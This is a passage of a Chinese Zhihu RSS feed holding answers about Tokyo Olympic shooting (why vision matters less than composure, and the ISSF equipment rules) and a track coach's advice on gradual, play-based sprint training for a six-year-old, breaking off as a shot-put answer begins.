data-original-src=\"v2-4c918094ff8d050c877ffcd3f5c60dd8\" data-watermark-src=\"v2-7414622bcfa55c90c2b069f95cfda240\" data-private-watermark-src=\"v2-394c3ad916878ab9576b3d1413fa80a0\"></p>\n<p><br></p>\n<p>今年东京奥运会首金杨倩，女子十米气步枪，杨倩的最后一枪只有9.8环，发挥失常，她自己打完可能都以为冠军没戏了，然而俄罗斯的阿纳斯塔西娅·加拉希娜更是很失误的打了8.9环。最后一枪决出了胜负。</p>\n<p>杨倩：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-80e7e69eb62cae639ebbff4b94b3ef02_720w.jpg?rss\" data-rawwidth=\"1924\" data-rawheight=\"1014\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-80e7e69eb62cae639ebbff4b94b3ef02\" data-watermark-src=\"v2-91d717f99b06b47dd296b66129e4b9af\" data-private-watermark-src=\"v2-fd8ac62e4b3acfc5c111ebad8bb246d1\"></p>\n<p><br></p>\n<p>加拉希娜：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-227d2e5d4cae9e943493edfb1ba2084c_720w.jpg?rss\" data-rawwidth=\"1922\" data-rawheight=\"1026\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-227d2e5d4cae9e943493edfb1ba2084c\" data-watermark-src=\"v2-f78e6f0a839bec800f4ce2eb795b7c2b\" data-private-watermark-src=\"v2-82b7c4c73680d5fca423ce4df88477ea\"></p>\n<p><br></p>\n<p>结合10米这个距离、这个小黑点，想象一下对她们而言大失水准的9.8环、8.9环，是什么概念。它们和各自最高的10.9环，位移的差异，又是怎样一个毫米数值。</p>\n<p>——<b>人类的视觉，精度完全没法达到这个水准。</b></p>\n<p>这种情况下，<b>视力度数的差异，影响也就没那么大了。</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f1528de1e6d0c05c876c86a6368d4424_720w.jpg?rss\" data-rawwidth=\"700\" data-rawheight=\"467\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f1528de1e6d0c05c876c86a6368d4424\" data-watermark-src=\"v2-6895316fe5dab70083838d6a063a6a89\" data-private-watermark-src=\"v2-52f7b16b73412f8f182b84f3f8d8e55f\"></p>\n<p><br></p>\n<p>所以开头才说，视力无法成为决定最终射击成绩关键因素，<b>心理负荷的调节能力</b>和<b>技术动作的稳定性</b>，才是最最最重要的。</p>\n<p>很多人提到杨倩，都知道她是00后，最近还在热议她颁奖时的比心动作、美甲图案、清华学生身份……这个2000年7月出生的姑娘，2011年已经开始射击训练、2012年就参加比赛了。</p>\n<p>这整整十年的专业训练中，心理一直是需要伴随技术同步训练的内容。集中的志趣定向、超强的自控力、坚忍的意志品质、进取心……缺一不可。</p>\n<p>区别其他项目，射击运动员往往要更荣辱不惊一些，尤其是在参加大赛的多个项目中，不管第一项是夺冠还是失败，都要求选手能尽量恢复到平常心的状态进入另一项——就这种能力的考验而言，整个奥运会项目中也很难找到第二个了。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-6dadc2607e9cea38ddec2d870cb72ea6_720w.jpg?rss\" data-rawwidth=\"1536\" data-rawheight=\"1025\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-6dadc2607e9cea38ddec2d870cb72ea6\" data-watermark-src=\"v2-43070ecdf793747cb5d1ffe9062e7d68\" data-private-watermark-src=\"v2-360575c880d0f6d3b0fd6bfd26172d1b\"></p>\n<p><br></p>\n<p>如今奥运会采用的淘汰制（得分最低者陆续被淘汰，最后冠亚军直接PK对决）在比赛观赏性上显然更紧张刺激，对选手的心理考验是极高的。</p>\n<p>因此，射击届也有一个默认的说法，<b>高手之间的竞争往往不是技术的竞争，而是一场无烟的心理战争。</b></p>\n<p><br></p>\n<p>技术动作的稳定性方面，射击选手也会进行大量的体能训练、力量训练。看起来“毫无训练痕迹”的射击运动员，他们在核心肌群的稳定性方面，要远超于普通人。</p>\n<p>关于稳定性有一个非常经典的测试（普通人也可以尝试一下）：</p>\n<p><b>光脚站在平整地面，单脚站立，另一只脚叠放脚背上或悬空，双臂平伸，闭上双眼，然后开始计时——普通人往往在20-60秒间，就无法保持平衡了。</b></p>\n<p>而杜丽之前曾透露过，<b>职业射击运动员能站数分钟甚至十几分钟。</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ac4c268082a1dbe8930b06391d3d58ba_720w.jpg?rss\" data-rawwidth=\"900\" data-rawheight=\"643\" data-size=\"normal\" data-caption=\"同为十米气步枪选手，2004年拿到雅典奥运会首金的杜丽，如今已是2020年东京奥运会首金杨倩的教练之一\" data-watermark=\"watermark\" data-original-src=\"v2-ac4c268082a1dbe8930b06391d3d58ba\" data-watermark-src=\"v2-9503f92f82b8569d146e9a06b6f395a7\" data-private-watermark-src=\"v2-2f5508e617c5e708dfaf68dd396afc2c\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-ea534331a69079cd508510e5fa4e3bec_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"869\" data-size=\"normal\" data-caption=\"东京夺金后，庞伟的金牌数量也追平妻子杜丽。而庞伟从身型上看，也许也更接近普通人，属于“毫无训练痕迹”的那类。但他们的稳定性及心理素质，则远高于一般人\" data-watermark=\"watermark\" data-original-src=\"v2-ea534331a69079cd508510e5fa4e3bec\" data-watermark-src=\"v2-2676bc9b6a21e63f656e728456f249c1\" data-private-watermark-src=\"v2-4aefb4704a58519f87910e3d46893764\"></p>\n<p><br></p>\n<p>所以心理负荷的控制能力、技术动作和身体的稳定能力，这些都要远远比视力重要。</p>\n<p>和普通人视力水平相似的射击选手之所以做到机器般的精准度，用卖油翁的话来说，</p>\n<p>“无它，唯手熟尔。”</p>\n<hr>\n<p>最后多提一下气步枪射击的装备——</p>\n<p><br></p>\n<p>因为射击器械、射击姿势的不同，气手枪和气步枪的装备差异极大。</p>\n<p>气手枪往往穿着较为舒适、日常运动的服装即可，也不允许借助外界装备来提高射击时的稳定性。而气步枪则全副武装、如同戴了一副盔甲一样：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7e4ea6eb5560e511a356b3558519b261_720w.jpg?rss\" data-rawwidth=\"1199\" data-rawheight=\"820\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7e4ea6eb5560e511a356b3558519b261\" data-watermark-src=\"v2-9ccddc00b2cf6ca8783129292865bdce\" data-private-watermark-src=\"v2-0a5285fd59918eefa14727c3b2932cb8\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f36277de0652d5801ffa10c472bd20ff_720w.jpg?rss\" data-rawwidth=\"2158\" data-rawheight=\"1216\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f36277de0652d5801ffa10c472bd20ff\" data-watermark-src=\"v2-a86080cb9806ed90c35f56b2e020eba4\" data-private-watermark-src=\"v2-110569dc2dcce28b75abd2149a0a3680\"></p>\n<p><br></p>\n<p>气步枪的射击服，用盔甲形容真不为过。一般用料包括两层厚帆布外加皮革，因此过去的射击服，重量和厚度都相当的惊人，5+公斤是常态。2004年雅典奥运会后，世界射击联合会（issf）对装备有过调整，稍微轻薄了一些。</p>\n<p>专业选手的射击服都是量身定做、专人专制的，<b>整个测量的繁琐程度，远超过很多高级定制西装的规格。</b></p>\n<p>非职业射击训练者，采购专业射击服时如果无法像职业选手那样测量，也需要填写相当繁琐的身体数据，最终的射击服才能勉强一用。</p>\n<p>——就算两个选手身高体重一样，看起来粗粗大大的射击服依然不能换着穿。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9d1ddd68ec017ff6b15eb4df07cf773a_720w.gif?rss\" data-rawwidth=\"555\" data-rawheight=\"300\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-9d1ddd68ec017ff6b15eb4df07cf773a\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>射击服的所有功能设计，也为达到射击过程中<b>完美的稳定性</b>，以及<b>尽可能杜绝一切外界的、选手自身的干扰</b>，并且<b>对颈椎、腰背等部位起到保护和预防慢性伤病</b>的作用。</p>\n<p>其中选手自身的干扰，就包括因为心脏跳动引起的、和呼吸起伏时身体出现的晃动——结合上面射击成绩和靶纸尺寸，想象一下心跳、呼吸等日常毫无存在感的生理动作，都会极大影响射击的精准度。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-8f2115d5f6c2b5aaaa7635cc12dda9bd_720w.jpg?rss\" data-rawwidth=\"2074\" data-rawheight=\"1392\" data-size=\"normal\" data-caption=\"与视觉上的粗矿不同，实际射击服对细节精度、功能要求都极高，是技术含量很高的专业定制化装备\" data-watermark=\"watermark\" data-original-src=\"v2-8f2115d5f6c2b5aaaa7635cc12dda9bd\" data-watermark-src=\"v2-6208fe7e4ff1cf415820fd14efae0c60\" data-private-watermark-src=\"v2-7c64117af74e7817d86c51592dec1192\"></p>\n<p><br></p>\n<p>但本质上，射击又会避免装备带来的稳定性额外加成，所以对装备依然有条条框框的检测标准。</p>\n<p>比如射击鞋。</p>\n<p>在站姿射击中，站立的稳定性、鞋底的防滑性无疑是很重要的。<b>假设选手穿着完全无法曲折、也毫无缓震性的中底，显然稳定性就能达到最大——issf就杜绝了这种情况。</b></p>\n<p>它要求射击鞋“必须是可弯曲的”。专门有个测试射击鞋的器械，要求<b>15牛顿米的力施加到中底时，鞋底必须达到至少22.5°的弯曲。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ef6a31cde5087face3793b46a4baba79_720w.jpg?rss\" data-rawwidth=\"2072\" data-rawheight=\"1382\" data-size=\"normal\" data-caption=\"专业射击用鞋在中底厚度、鞋帮高度等都有严格要求，因为都可能会增加射击时的额外稳定性\" data-watermark=\"watermark\" data-original-src=\"v2-ef6a31cde5087face3793b46a4baba79\" data-watermark-src=\"v2-9915911ea4f747e5296fcd7ca077cc55\" data-private-watermark-src=\"v2-7db8aeafbba433d1c8909a44c8ec50ec\"></p>\n<p><br></p>\n<p>因而，射击服、射击鞋等一方面为了这项运动的单个选手量身定制，尽可能满足稳定性的需要，一方面又不能成为提升精准度、左右成绩的额外加成。</p>\n<hr>\n<p>东京奥运会期间，相关的赛事资讯都会在知乎想法中发布，感谢关注<a href=\"https://www.zhihu.com/org/yun-dong-fen-zi-cheng-lan-wen-hua\" class=\"internal\">运动分子</a></p>\n<hr>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/474575633/answer/2024002780\" class=\"internal\">为什么一些国家的奥运乒乓球选手是华人？</a></li>\n<li><a href=\"https://www.zhihu.com/question/50191573/answer/1953518631\" class=\"internal\">为什么中国运动员运动寿命短？</a></li>\n<li><a href=\"https://www.zhihu.com/question/344468000/answer/1854947316\" class=\"internal\">新中国体育史上，有哪些比赛的瞬间令你沸腾？</a></li>\n<li><a href=\"https://www.zhihu.com/question/373511126/answer/1608008791\" class=\"internal\">举重运动员有多牛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/341661943/answer/1452491051\" class=\"internal\">撑杆跳这项运动的意义是什么，是如何发明的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/293545938/answer/489299124\" class=\"internal\">一个身体素质普通的人被车拉着能达到博尔特的速度吗？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39665045/answer/275431053\" class=\"internal\">历史上有哪些精心布局却被对方一下破局的故事？</a></li>\n<li><a href=\"https://www.zhihu.com/question/20403477/answer/712635036\" class=\"internal\">110 米栏的顶级运动员，为什么他们不参加100米的比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/302684797/answer/544389984\" class=\"internal\">男生100m跑到11s很奇怪嘛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/282601379/answer/528371413\" class=\"internal\">跑150米然后截取速度最快的连续100米区间作为100米的成绩是否更合理？</a></li>\n<li><a href=\"https://www.zhihu.com/question/352385663/answer/884879335\" class=\"internal\">为什么马拉松选手最后不冲刺？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39239070/answer/594491009\" class=\"internal\">体育赛事中有哪些「几乎不可破」的纪录？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">跑5公里需要多少分钟？</a></li>\n<li><a href=\"https://www.zhihu.com/question/407047274/answer/1363793504\" class=\"internal\">很多退役的军人都说自己五公里可以15/16分，军队的训练真的这么强么？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">为什么田径室外百米记录要比室内百米记录快？</a></li>\n</ul>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yun-dong-fen-zi-cheng-lan-wen-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">运动分子</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/474850082/answer/2026108063?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">122 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/30252383?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">近视眼对玩射击或者射箭运动的障碍大吗？</a><br><a href=\"http://www.zhihu.com/question/345087864?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">高中女生左眼近视625右眼近视675能否参加运动会100米短跑？</a><br>\n","link":"http://www.zhihu.com/question/474850082/answer/2026108063?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"6 岁的孩子说想学跑步，成为像苏炳添那样的运动员，作为家长该如何培养？","date":"2021-08-02 03:45:08","description":"\n<p>田径出身的一名大学田径队教练来谈一谈我的看法，希望有所借鉴。</p>\n<p>我先从专业的角度，来给一些解答。</p>\n<h2>7-14岁是孩子速度发展的一个窗口期</h2>\n<p>人的身体素质，包括速度、力量、耐力、灵敏、平衡等，在不同的年龄段，都会有发展比较迅速或缓慢的时候，当然儿童处在成长期，身体各指标都会快速增长，但总有增长尤为突出的某项指标，我们把这段快速增长的一段时期，称为快速发展的“窗口期”。</p>\n<p>为什么小学会把快速跑当成一个衡量身体素质的重要指标呢？就是因此此年龄段，正好处在孩子速度快速发展的阶段，在这个阶段有意识地培养孩子的速度，提升孩子的爆发力，就会事半功倍。</p>\n<p>作为一名田径运动员、教练，苏炳添能够以打破亚洲纪录记录的成绩闯进奥运会男子100米决赛，成为第一个站在飞人赛道的黄种人，我由衷感到自豪！这个时候，如果孩子热爱体育，有这样的信念支撑他，有这么一个强有力的偶像光环作为他的榜样，作为父母，我给的建议是：</p>\n<p><b>支持他，从心理和实际行动上，给他鼓励和帮助！</b></p>\n<p><b>因为我深知，扎根一个梦想的种子，对于一个满怀激情的孩子来说，是无比重要！而此时父母给予的帮助对孩子来说，定会弥足珍贵！</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-96c0e546fd86fab8e1ef5412b8270e58_720w.jpg?rss\" data-rawwidth=\"2428\" data-rawheight=\"1358\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-96c0e546fd86fab8e1ef5412b8270e58\" data-watermark-src=\"v2-0c8f2561dccc838fad0ffff2f2d7ff93\" data-private-watermark-src=\"v2-1f6e03bacaa0a6f6ef6a5961346576d0\"></p>\n<p>作为父母，孩子的监护人，看着子女健康成长，衣食无忧，建功立业，结婚生子，是我们所愿所想。但培养他们良好的行为习惯，磨炼他们坚强的意志品质，遵守社会公德和法律，是父母的职责所在，此外，我们还希望在顺境中为其欢欣鼓舞，逆境中支持鼓励，给他们心中埋下一粒种子，为他们的梦想保驾护航。</p>\n<p>那么6岁的孩子究竟是否合适？在这些练习过程中又要注意什么呢？父母又要做什么呢？不要着急，请听我一一解答。</p>\n<h2>田径是一切运动的基础</h2>\n<p>请允许我\"王婆卖瓜\"一番，田径是运动之母，我们自打出生起，就跟田径运动分不开。走、跑、跳、投等，融入到我们的生活方方面面。<b>6岁的孩子即将进入发展速度的窗口期，因此在此时学习跑步，是一项非常明智的选择，对于提升孩子的整体素质，大有裨益。</b>不论是否今后从事体育项目，都会让孩子收益。当然如果今后发现天赋异禀，转成其他专业，相信田径带来的益处，绝对会让孩子受益匪浅。</p>\n<p><br></p>\n<p>俗话说的好，“兴趣是最好的老师”。孩子有了明确的偶像，有了学的兴趣，可谓有了“人和”。此时又是孩子练习短跑提升速度的窗口期，正所谓拥有了“天时”，那么这个“地利”，究竟如何获得呢？也就是我下面要讲的练什么，以及怎么练，以及练习过程中的注意事项。</p>\n<h2>身体锻炼一定要符合孩子身心发展</h2>\n<p>练什么怎么练，主要依据还是儿童在此时期的生理特点及心理特点来决定。孩子在6岁时，活泼爱动是天性，喜欢追赶打闹。你会发现带娃出去玩的时候，他们喜欢跑跑就停下，没休息多久马上就到处跑的情况反复发生。到底是为什么呢？简单来讲，<b>小朋友就好比一个封不上口的气球</b>，气打多了就会爆掉，因此能量存储有限。释放能量时，因为封不上口，“呼”的一下就全放走了，所以他们就容易累。气没了，再打气，不一会儿，他们又活力满满了。</p>\n<p>基于儿童身心发展特点，在给小朋友安排短跑练习时，有几个原则。</p>\n<blockquote>\n<b>第一，少量多次。</b><br><b>第二，循序渐进。</b><br><b>第三，娱乐性强。</b><br><b>第四，目标明确。</b>\n</blockquote>\n<h3><b>Rule NO.1 少量多次</b></h3>\n<p>小朋友耐力差，因此单次跑步的练习，距离一定不要长，控制好运动量。在每个单元的训练，合理规划好热身、练习时间、休息时间、放松，并且在休息时要注意补水和补充能量。多次，是因为儿童恢复能力好，可以在短暂休息后，再继续进行下一次练习。</p>\n<p>比如，我们在一堂40分钟的训练课中，可以给儿童安排10分钟的热身，热身时可进行慢跑或者做一些跟跑动有关的游戏，带着小朋友活动头、肩、髋、膝、踝各个关节，拉伸手臂和腿部肌肉，达到热身目的。25分钟的正课时间里，安排3组20米跑，组间休息1-2分钟，3组50米跑，组间休息2-3分钟。20米完成后，可增加休息时间，再进行50米练习。最后5分钟用来整理和放松，重点进行大、小腿的拉伸和背部的伸展放松。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8912ea1c3cc3782205098ceeff5ed43f_720w.jpg?rss\" data-rawwidth=\"1026\" data-rawheight=\"548\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8912ea1c3cc3782205098ceeff5ed43f\" data-watermark-src=\"v2-15b887ec5b1ae845b7a789035753b55f\" data-private-watermark-src=\"v2-50024f195a572935e12d543711ea183a\"></p>\n<h3>Rule NO.2 循序渐进</h3>\n<p>即使有了偶像，自己有浓厚的兴趣，也要注意循序渐进。苏炳添将近32岁，历时3届奥运之旅才终于冲进决赛，我们也不可能一天两天，一年两年，就能有质的飞跃。<b>尤其是在成绩大幅增长的时候，更应该注意保护，不能猛进。</b>我当年跳高受伤，就是因为在3个月从1.70米长了20厘米，身体其他方面素质没有跟上，太过激进，才会受伤影响了后续成绩增长的。因此，循序渐进，在孩子已经适应了前一单元的量和强度后，才可以再增加。</p>\n<p>例如，在前一次安排的主要内容里，小朋友在3组20米，3组50米已经可以完成后，在递进的练习中，可以通过增加量或者增加强度，以及同时增加量和强度的形式进行变换组合。</p>\n<p>PlanA 建议在保证运动强度不变的前提下，先提高运动量。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2e96f88f39e8d11bd9c4cd81320a4dec_720w.jpg?rss\" data-rawwidth=\"1012\" data-rawheight=\"554\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-2e96f88f39e8d11bd9c4cd81320a4dec\" data-watermark-src=\"v2-9a55b9b4834a383a6e86c1b909786f66\" data-private-watermark-src=\"v2-ae0c4494d14d53027caccc624df1b19e\"></p>\n<p>PlanB 完成A方案后，再在运动量不变的情况下，提高运动强度。因为小朋友没有经过系统训练，很难体会速度感，不了解90%的速度跑和100%全力冲刺的区别，因此我们可以通过缩短间歇时间来提高运动强度。但要注意20米和50米之间的间歇要保障，进行休息和补水。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ca3b8640965669f06b2c28993544ef21_720w.jpg?rss\" data-rawwidth=\"1010\" data-rawheight=\"572\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ca3b8640965669f06b2c28993544ef21\" data-watermark-src=\"v2-91de07b77e77fdde00f2ab18a37733fa\" data-private-watermark-src=\"v2-1cda9f216ad02f5c1855b7c9f1a1bb70\"></p>\n<p>PlanC 运动量和强度分别提升且适应后，再同时提高。这一单元的训练，对成绩的提升尤为重要，同样需要注意在20米结束后，保证充足的休息时间。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7ad885ef5346ea4e8e1e4543bcde23ac_720w.jpg?rss\" data-rawwidth=\"1028\" data-rawheight=\"570\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7ad885ef5346ea4e8e1e4543bcde23ac\" data-watermark-src=\"v2-9974145b54fd4a9aa7401b2024c33845\" data-private-watermark-src=\"v2-b75f1714d5343d75c1cdb736cb7c19d8\"></p>\n<p>根据儿童运动能力的提升和实际情况，组数、间歇时间，甚至是跑动距离都可以进行调整，这些计划和安排，都要因人而异，适时调整和改变。</p>\n<h3>Rule NO.3 娱乐性强</h3>\n<p>根据儿童心理发展特点，枯燥单一的练习，会让孩子失去兴趣。因此娱乐性就显得尤为重要。我们可以通过改变形式、方法，增加器材、设备等，提升孩子的兴趣，让看似枯燥的田径运动，也能发挥出它应有的魅力，让孩子在真正下定决心从事这项运动之前，仍然能够保有兴趣，让激情不被扼杀在摇篮里。<b>毕竟，真正的训练是非常苦的，每个奥运选手的成长之路，训练都是无比艰辛和刻苦，他们付出了常人无法想象的努力和心血。</b></p>\n<p>儿童在这个年龄，不仅仅是单一的直线跑。可以设定标志点，比如多种形式的折返跑、比如多人追逐跑（从前最常见的老鹰抓小鸡、撕名牌等）、配合道具的模仿救护员、消防员营救等多种形式，持球或其他物品的传递或亲子接力等，都可以融入进来，让孩子在提升速度练习的同时，觉得好玩并愿意坚持下去。</p>\n<p>去年冬天我带着小萌利用标志点进行了一些速度练习，可以跟各位分享几种方式方法。</p>\n<a href=\"https://www.zhihu.com/zvideo/1405368268631220224\">萌爸Kyle-标志点的速度练习</a><h3>Rule NO.4 目标明确</h3>\n<p>目标明确孩子执行力才更强。要有长期目标和短期目标。长期目标要有大的方向，尤其如果今后是奔着职业运动员发展的，要有一个大概的时间点，在此之前需要提升的专项素质和身体素质，都要达到要求才可以。短期目标要实际可操作付出努力后能达到，小到一次训练中孩子需要跑的距离，次数、时间等，都要有制定，这样孩子才会有动力，训练之后达成目标才会有成就感，也会激励他再接再厉继续前行。</p>\n<p>我们不能仅仅能看到的成绩的快慢。循序渐进，扎实走好每一步，有明确的目标，经过艰苦训练，才是苏炳添最终登上荣耀舞台的法宝。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-27c0964e1a9badd2229e15ee3a0e13f6_720w.jpg?rss\" data-rawwidth=\"2400\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"苏炳添的名字印刻在奥运会男子100米飞人大战的战场\" data-watermark=\"watermark\" data-original-src=\"v2-27c0964e1a9badd2229e15ee3a0e13f6\" data-watermark-src=\"v2-7910049c7652a94ec5b7cba374a8ed58\" data-private-watermark-src=\"v2-3cec0b19dc1f69b662064b823b73d546\"></p>\n<p>作为一名田径教练员，我也会根据不同项目，在不同时间，给队员安排具体的训练计划，让队员有目标，有侧重点，可操作，能执行。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3087386865d503c9f89cd2b85b6e039b_720w.jpg?rss\" data-rawwidth=\"970\" data-rawheight=\"1054\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3087386865d503c9f89cd2b85b6e039b\" data-watermark-src=\"v2-4083ba3c14aa26a1bb0ae887f21abffe\" data-private-watermark-src=\"v2-563ea294176285689e12f85c051dd35b\"></p>\n<h2>父母到底应该做什么？怎样支持孩子呢？</h2>\n<p>6岁的儿童还处在身体发展阶段，作为一名专业的田径教练员，<b>我强烈反对过早的竞技化</b>。因此，<b>不要把孩子送进体校，也不要过早确定短跑这个项目！</b></p>\n<p>如果家长有条件，可以先给孩子试着报一些体能培训班，当然有些培训机构以赚钱为目的，教练的能力参差不齐，有的会为了“效果”，过早的榨干孩子的潜能，而单一发展学生的某一身体素质。</p>\n<p>这时候，如果能送到有田径队的学校（大学、中学、小学皆可）里让孩子跟着活动，或送到更专业的地方就再好不过，<b>一定要跟教练说明来意，并表明观点：让孩子跟着玩，但不能像专业运动员一样练。</b>这么做的目的，一方面进行练习时会正规、系统；另一方面，可以让教练观察一下孩子在这方面是否有天赋。</p>\n<p>毕竟，竞技体育的选材都是非常严苛的。如果过早开发，可能会让孩子失去冲击更好成绩的机会；但如果孩子没有天赋，也好及时转型，避免时间、精力的浪费。但不论是否走专业路线，让孩子从事体育锻炼，适度练习对身体有很大好处，有益且有效。父母在孩子没有独立判断事情的能力之前，帮助孩子做最合理的决策，出谋划策，为他们的梦想护航，让他们向着正确的方向稳步前行。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/meng-ba-kyle?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">萌爸Kyle</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/476569561/answer/2033431219?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">121 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/35348789?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">博尔特是不是人类体育史上最伟大的运动员？</a><br><a href=\"http://www.zhihu.com/question/20350644?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">博尔特能否被称作迄今为止最伟大的田径运动员？</a><br>\n","link":"http://www.zhihu.com/question/476569561/answer/2033431219?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"2020 东京奥运会女子铅球决赛巩立姣夺得中国奥运田赛第一金，如何评价她的表现？","date":"2021-08-01 06:30:09","description":"\n<p>奥运冠军，拿来吧你！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-19a919a693318c9d3a223cf738f64154_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1364\" data-watermark=\"original\" data-original-src=\"v2-19a919a693318c9d3a223cf738f64154\" data-watermark-src=\"v2-89ad0fcb085bf8f26d12806b9b944666\" data-private-watermark-src=\"v2-b855dae886ecfddae987202f3b8e4a7c\"></p>\n<p>在东京<a href=\"http://link.zhihu.com/?target=https%3A//news.163.com/news/search%3Fkeyword%3D%25E5%25A5%25A5%25E8%25BF%2590%25E4%25BC%259A\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">奥运会</a>田径项目<a href=\"http://link.zhihu.com/?target=https%3A//www.163.com/keywords/7/3/75308d5b/1.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">田赛</a>女子<a href=\"http://link.zhihu.com/?target=https%3A//www.163.com/keywords/9/c/94c57403/1.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">铅球</a>决赛的比赛中，中国选手<a href=\"http://link.zhihu.com/?target=https%3A//news.163.com/news/search%3Fkeyword%3D%25E5%25B7%25A9%25E7%25AB%258B%25E5%25A7%25A3\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">巩立姣</a>以20.58米的成绩夺得了决赛第一名，刷新个人最佳成绩的同时也为<a href=\"http://link.zhihu.com/?target=https%3A//news.163.com/news/search%3Fkeyword%3D%25E4%25B8%25AD%25E5%259B%25BD%25E4%25BB%25A3%25E8%25A1%25A8%25E5%259B%25A2\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">中国代表团</a>拿下本届奥运会第22枚金牌，这也是中国田径队在东京奥运会上的首块金牌。</p>\n<p>回顾她本场比赛：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a28e7c0b5ce63028f177a8ff0924ddf2_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-a28e7c0b5ce63028f177a8ff0924ddf2\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>出场，巩立姣发射爱心</p>\n<p><img src=\"https://pic1.zhimg.com/v2-f540fbca74d4844d043cd6e9d1afeef5_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"424\" data-rawheight=\"264\" data-watermark=\"original\" data-original-src=\"v2-f540fbca74d4844d043cd6e9d1afeef5\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>第一投，19米95</p>\n<p><img 